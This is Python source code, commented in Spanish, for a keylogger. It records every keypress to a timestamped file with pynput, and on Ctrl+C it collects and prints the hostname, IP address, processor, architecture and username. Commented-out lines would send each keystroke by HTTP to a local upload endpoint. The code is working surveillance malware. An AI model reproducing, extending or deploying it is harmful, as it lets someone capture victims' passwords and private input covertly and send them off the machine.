# python -m pip install pynput
import datetime
from pynput.keyboard import Listener, Controller
import time
import os
import socket
import platform
import getpass
import requests
import re  # Para utilizar expresiones regulares

# keyboard=Controller()
#response = requests.get('http://localhost:5000/upload/HolaNoraj')
  #$response = requests.get('http://localhost:5000/upload/'+key.replace("'", ""))


d=datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')



def key_recorder(key):
      # Cargamos en key el valor de la tecla presionada.
      key=str(key)

      # Abrimos el archivo con nombre de la fecha de creación
      f= open('keylogger_{}.txt'.format(d),'a')
      
       # SOLO PARA LA FASE DE PRUEBAS, permite salir del programa
      if key == "'\\x03'":
            f.close()

            os.system('whoami')
            hostname = socket.gethostname()
            IP = socket.gethostbyname(hostname)
            architecture=platform.architecture()
            processor=platform.processor()
            userName = getpass.getuser()
            print("**********")
            print(hostname)
            print(IP)
            print(architecture)
            print(processor)
            print(userName)
            print("**********")
            quit()


      # Usando expresiones regulares buscamos palabras que sean
      # Key, para colocarlas con []
      if re.match('Key.*', key):
            key = '[' + key + ']'
            key = key.replace("Key.","")
            f.write(key)
            
      else:
            key = key.replace("'", "")
            f.write(key)

            # response = requests.get('http://localhost:5000/upload/'+key)

  
 


with Listener(on_press=key_recorder) as l:
      l.join()
  